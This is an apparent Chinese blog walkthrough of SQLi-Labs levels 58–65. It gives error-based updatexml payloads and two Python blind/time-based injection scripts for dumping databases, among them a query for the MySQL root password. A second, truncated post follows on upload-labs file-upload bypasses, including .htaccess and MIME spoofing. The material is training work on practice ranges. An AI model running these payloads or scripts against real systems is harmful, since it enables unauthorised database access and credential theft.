title="Less-58"></a>Less-58</h3><p>进入此关，次数被减少到5次，这就很棘手了</p><p>经过我的多次尝试（重置），这里使用联合注入行不通，因为不管怎么构造联合查询语句都只会返回用户名和密码的值</p><p>输入<code>?id=1&#39;</code>，页面报错，根据错误提示显示判断闭合方式为<code>&#39; --+</code>，且为字符型注入，因为这里有完整的报错语句，我们使用报错注入</p><p>查看当前库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726101434243.png" alt="image-20240726101434243"></p><p>查看数据库下数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726101510217.png" alt="image-20240726101510217"></p><p>查看数据表内所有字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;xjgy3zcpbw&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726101626866.png" alt="image-20240726101626866"></p><p>查看数据表内数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_FT7Y) from challenges.xjgy3zcpbw),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726101741517.png" alt="image-20240726101741517"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726101802278.png" alt="image-20240726101802278"></p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>与上一关相同，也是只有五次机会（真不够用啊）</p><p>所以我们尽量在前一轮完成判断字符型数字型，后一轮完成拿KEY</p><p>经过尝试，此关为数字型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726102247826.png" alt="image-20240726102247826"></p><p>用最后一次机会尝试了一下联合注入方式，发现还是不行（忘记截图了……）</p><p>重置后继续尝试，这次尝试报错注入</p><p>绕过查看数据库步骤直接查看数据表（节省次数的好方法）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726102703502.png" alt="image-20240726102703502"></p><p>查看数据表内字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;g0i2302861&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726102756629.png" alt="image-20240726102756629"></p><p>查看数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 and updatexml(1,concat(0x7e,(select group_concat(secret_THL2) from challenges.g0i2302861),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726102909813.png" alt="image-20240726102909813"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726102923107.png" alt="image-20240726102923107"></p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>进入此关，判断字符型数字型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p>页面正常，继续输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p>页面报错，根据报错信息判断闭合方式为<code>&quot;) --+</code>，且为字符型注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726103706782.png" alt="image-20240726103706782"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726103721889.png" alt="image-20240726103721889"></p><p>因为页面返回的完整的错误信息，所以这里我们使用报错注入，步骤与上一题一样</p><p>跳过查看数据库步骤直接查看数据表（节省步骤）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726103935186.png" alt="image-20240726103935186"></p><p>查看数据表内字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;wxvl7lv180&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726104058183.png" alt="image-20240726104058183"></p><p>查看数据表内数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_VJD8) from wxvl7lv180),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726104140633.png" alt="image-20240726104140633"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726104200014.png" alt="image-20240726104200014"></p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>判断字符型数字型</p><p>经过两轮尝试（这题对于id处理还是严谨，我也是第一次看到有把id套两层括号的，可能我头发比较多，见识少了）</p><p>也是使用报错注入，步骤与前几题一样</p><p>这里就只放payload了（都试验过了，放心用）</p><p>查看数据库内表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>查看数据表内字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;0irq2xn3i4&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>查看数据表内数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(secret_MGMW) from 0irq2xn3i4),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726105129826.png" alt="image-20240726105129826"></p><h3 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h3><p>进入此关，要求130次内拿到KEY。哦吼，这次可以爽试了</p><p>经过仔细的尝试，最后判断闭合方式为<code>&#39;)</code>。</p><p>但发现不显示错误信息，这不是让我们用布尔盲注嘛</p><p>你干嘛~，嗨嗨哟</p><p>这里附上大佬的脚本（<strong>见手册末尾附录1</strong>），需要自行更改脚本内的payload实现逐步爆破</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726140826262.png" alt="image-20240726140826262"></p><h3 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h3><p>本关也是130次机会</p><p>也是先判断是否为字符型和数字型</p><p>输入id&#x3D;1 and 1&#x3D;2，明显不是</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726141502584.png" alt="image-20240726141502584"></p><p>加入单引号，页面不显示内容，说明注入点带有单引号</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726141551585.png" alt="image-20240726141551585"></p><p>更改为and1&#x3D;1，在结尾加入注释符<code>--+</code>，页面正常显示，判断出此页面闭合为<code>&#39; --+</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726141725723.png" alt="image-20240726141725723"></p><p>但是在尝试的时候页面不显示错误信息，无法使用报错注入，尝试联合注入，无果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726141829384.png" alt="image-20240726141829384"></p><p>那么剩下的就是一种方法，布尔盲注</p><p>建议直接使用脚本进行爆破整个数据库（<strong>见手册末尾附录1</strong>）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726144932758.png" alt="image-20240726144932758"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726144853459.png" alt="image-20240726144853459"></p><h3 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h3><p>进入本关，输入<code>?id=1</code>，页面正常回显，加上单引号，页面不回显，且没有任何错误信息</p><p>又是老朋友布尔盲注，哈哈哈好开心啊（&amp;*%*￥……#&amp;%*￥……#￥&amp;#@#@#……）</p><p>依次尝试以下payload，判断字符型和数字型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1--+   #回显错误</span><br><span class="line">?id=1&#x27;--+  #回显错误</span><br><span class="line">?id=1&quot;--+  #回显错误</span><br><span class="line">?id=1)--+  #回显错误</span><br><span class="line">?id=1))--+ #回显正常</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726145254467.png" alt="image-20240726145254467"></p><p>判断为数字型注入，使用脚本进行爆破（<strong>见手册末尾附录1</strong>）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726150741059.png" alt="image-20240726150741059"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726150806325.png" alt="image-20240726150806325"></p><h3 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h3><p>进入本关，输入<code>?id=1</code>，页面正常回显</p><p>输入<code>?id=1&#39;</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726151012942.png" alt="image-20240726151012942"></p><p>输入<code>?id=1&quot;</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726151035157.png" alt="image-20240726151035157"></p><p>没有任何错误信息，依然是万恶的布尔盲注</p><p>经过尝试，判断为字符型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;--+ #回显错误</span><br><span class="line">?id=1&quot;)--+ #回显正常</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726151209765.png" alt="image-20240726151209765"></p><p>依旧是使用脚本进行爆破（<strong>见手册末尾附录1</strong>）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726152944534.png" alt="image-20240726152944534"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240726153018706.png" alt="image-20240726153018706"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到此，整套SQLi-Labs中一共65道SQL注入的题目就都做完了，编写此手册一共花费了一周的时间。虽然中间遇到了挺多的坎坷，但也总算是挺过来了，没有放弃。经过这一周的不断刷题，我也学到了很多，也被一些骚操作的注入方式折磨的死去活来（），不过也都过去了。希望这本花费了巨大时间与心血的手册，能给正在看的你提供一些帮助！如果喜欢的话也可以关注我的Github，接下来会更新更多的内容哦！</p><h2 id="附录1"><a href="#附录1" class="headerlink" title="附录1"></a>附录1</h2><p>布尔盲注爆破脚本（适用于Less-62、Less-63、Less-64、Less-65），如出现连续的大片空白，请检查payload是否出现错误或延长payload末尾sleep()方法中的数字，将1.5修改2或更久，下方的if判断，<code>&lt;</code>符号后的数字也要相继更改，需要比sleep()中的时间久一点</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">s = requests.session()          <span class="comment">#创建session对象后，才可以调用对应的方法发送请求。</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.8/sqli-labs/Less-65/?id=&#x27;</span>   <span class="comment">#更改为自己关卡的url</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Less-62</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;)%0cand%0cif((ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,sleep(1.5))--+&#x27; #查看数据库</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;)%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\&#x27;challenges\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看数据表</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;)%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;替换为爆出的数据表&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看字段</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;)%0cand%0cif(ascii(substr((select(替换为爆出的字段)from(替换为爆出的数据表)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看表中信息</span></span><br><span class="line">        <span class="comment">#Less-63</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;%0cand%0cif((ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,sleep(1.5))--+&#x27; #查看数据库</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\&#x27;challenges\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看数据表</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;替换为爆出的数据表&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看字段</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&#x27;%0cand%0cif(ascii(substr((select(替换为爆出的字段)from(替换为爆出的数据表)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看表中信息     </span></span><br><span class="line">        <span class="comment">#Less-64</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1))%0cand%0cif((ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,sleep(1.5))--+&#x27; #查看数据库</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1))%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\&#x27;challenges\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看数据表</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1))%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;替换为爆出的数据表&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看字段</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1))%0cand%0cif(ascii(substr((select(替换为爆出的字段)from(替换为爆出的数据表)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看表中信息 </span></span><br><span class="line">        <span class="comment">#Less-65</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&quot;)%0cand%0cif((ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,sleep(1.5))--+&#x27; #查看数据库</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&quot;)%0cand%0cif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\&#x27;challenges\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看数据表</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&quot;)%0cand%0cif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;替换为爆出的数据表&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看字段</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1\&quot;)%0cand%0cif(ascii(substr((select(替换为爆出的字段)from(替换为爆出的数据表)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1.5))--+&#x27; #查看表中信息 </span></span><br><span class="line">        <span class="comment">#下方一行进行复制粘贴payload（记得将替换文本换成爆出来的信息！！！）  </span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#爆破代码:</span></span><br><span class="line">        stime = time.time()</span><br><span class="line">        url1 = url + payload</span><br><span class="line">        r = s.get(url=url1)</span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> time.time() - stime &lt; <span class="number">0.5</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="附录2"><a href="#附录2" class="headerlink" title="附录2"></a>附录2</h2><p>Less-9爆破脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将url 替换成你的靶场关卡网址</span></span><br><span class="line"><span class="comment"># 修改两个对应的payload</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 目标网址（不带参数）</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.5/sqli-labs/Less-9/&quot;</span></span><br><span class="line"><span class="comment"># 猜解长度使用的payload</span></span><br><span class="line">payload_len = <span class="string">&quot;&quot;&quot;?id=1&#x27; and if(</span></span><br><span class="line"><span class="string">(length(</span></span><br><span class="line"><span class="string">        (database())</span></span><br><span class="line"><span class="string">    ) =&#123;n&#125;)</span></span><br><span class="line"><span class="string">,sleep(5),3) -- a&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 枚举字符使用的payload</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;?id=1&#x27; and if(</span></span><br><span class="line"><span class="string">(ascii(</span></span><br><span class="line"><span class="string">substr(</span></span><br><span class="line"><span class="string">(database())</span></span><br><span class="line"><span class="string">,&#123;n&#125;,1)</span></span><br><span class="line"><span class="string">) =&#123;r&#125;)</span></span><br><span class="line"><span class="string">, sleep(5), 3) -- a&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLength</span>(<span class="params">url, payload</span>):</span><br><span class="line">    length = <span class="number">1</span>  <span class="comment"># 初始测试长度为1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url= url+payload_len.<span class="built_in">format</span>(n= length))</span><br><span class="line">        <span class="comment"># 页面响应时间 = 结束执行的时间 - 开始执行的时间</span></span><br><span class="line">        use_time = time.time() - start_time</span><br><span class="line">        <span class="comment"># 响应时间&gt;5秒时，表示猜解成功</span></span><br><span class="line">        <span class="keyword">if</span> use_time &gt; <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;测试长度完成，长度为：&#x27;</span>, length,)</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在测试长度：&#x27;</span>,length)</span><br><span class="line">            length += <span class="number">1</span>  <span class="comment"># 测试长度递增</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">url, payload, length</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始表名/库名为空</span></span><br><span class="line">    <span class="comment"># 第一层循环，截取每一个字符</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 第二层循环，枚举截取字符的每一种可能性</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url= url+payload_str.<span class="built_in">format</span>(n= l, r= n))</span><br><span class="line">            <span class="comment"># 页面响应时间 = 结束执行的时间 - 开始执行的时间</span></span><br><span class="line">            use_time = time.time() - start_time</span><br><span class="line">            <span class="comment"># 页面中出现此内容则表示成功</span></span><br><span class="line">            <span class="keyword">if</span> use_time &gt; <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">str</span>+= <span class="built_in">chr</span>(n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第&#x27;</span>, l, <span class="string">&#x27;个字符猜解成功：&#x27;</span>, <span class="built_in">str</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 开始猜解</span></span><br><span class="line">length = getLength(url, payload_len)</span><br><span class="line">getStr(url, payload_str, length)</span><br><span class="line"></span><br><span class="line"><span class="comment">#下面是脱库常用代码，用于替换上面payload_len和payload_str中的(database())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有数据库</span></span><br><span class="line"><span class="comment"># (select group_concat(schema_name)</span></span><br><span class="line"><span class="comment"># from information_schema.schemata)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # 获取 security 库的所有表</span></span><br><span class="line"><span class="comment"># (select group_concat(table_name)</span></span><br><span class="line"><span class="comment"># from information_schema.tables</span></span><br><span class="line"><span class="comment"># where table_schema=&quot;security&quot;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # 获取 users 表的所有字段</span></span><br><span class="line"><span class="comment"># (select group_concat(table_name)</span></span><br><span class="line"><span class="comment"># from information_schema.tables</span></span><br><span class="line"><span class="comment"># where table_schema=&quot;security&quot;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # 获取数据库管理员的密码</span></span><br><span class="line"><span class="comment"># (select password</span></span><br><span class="line"><span class="comment"># from mysql.user</span></span><br><span class="line"><span class="comment"># where user=&quot;root&quot;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload靶场总结</title>
      <link href="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs靶场总结"><a href="#upload-labs靶场总结" class="headerlink" title="upload-labs靶场总结"></a>upload-labs靶场总结</h1><p>编写人：Rannnn</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>提示：本pass在客户端使用js对不合法图片进行检查！<br>解决方法：浏览器禁用javascript或者将判断代码删除即可绕过<br>漏洞原理：网页前端使用JavaScript代码对不是图片的文件进行后缀检查，只需禁用JavaScript，前端代码就不会检查文件，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716160832339.png" alt="image-20240716160832339"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716160917334.png" alt="image-20240716160917334"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>提示：本pass在服务端对数据包的MIME进行检查！<br>解决办法：利用BurpSuite抓包，修改MIME为指定文件格式即可绕过<br>漏洞原理：网页使用后端进行文件检查，但方式是检查MIME信息，且MIME可以伪造，只需将提交文件的数据包抓下，将MIME信息伪造成合法的图片文件信息即可提交，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716161025034.png" alt="image-20240716161025034"><br>将框内的信息修改为image&#x2F;jpeg、image&#x2F;png或image&#x2F;gif</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716161246804.png" alt="image-20240716161246804"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>提示：本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！<br>解决方法：使用php3、php5等文件名即可绕过（前提：服务器需要支持）<br>漏洞原理：网页使用后端进行黑名单检查，但是黑名单不全，可以通过服务器解析其他文件名（如php3，php5等）进行提交，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716161519329.png" alt="image-20240716161519329"><br><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716161543382.png" alt="image-20240716161543382"></p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>提示：本pass禁止上传（过滤了好多，但没有了.htaccess）<br>解决方法：上传.htaccess文件，使其能够解析jpg文件即可绕过<br>条件：apache配置文件httpd.conf中启用了AllowOverride（AllowOverride All）<br>漏洞原理：网页后端进行黑名单过滤，黑名单也较全，但是没有过滤<code>.htaccess</code>文件，了解到<code>.htaccess</code>文件是用于解析文件夹内的文件以其定义的方式在网页上显示，只要提前定义好这个文件，进行上传，再上传一个由木马伪装的图片文件，查看是否解析，如解析则可进行攻击</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162036102.png" alt="image-20240716162036102"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162051575.png" alt="image-20240716162051575"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>提示：本pass禁止上传（过滤了好多，包括了.htaccess）<br>解决方法：查看源码，发现没有转换大小写，使用.PHP后缀即可绕过<br>漏洞原理：网页使用后端进行黑名单检查，黑名单较全，但是查看源码后发现过滤代码没有检查文件大小写，只要将文件转换成大写就可以进行上传，由于Windows系统特性（不区分大小写），所以即使文件后缀大写也可以进行解析。Linux暂未测试</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162304842.png" alt="image-20240716162304842"></p><p><img 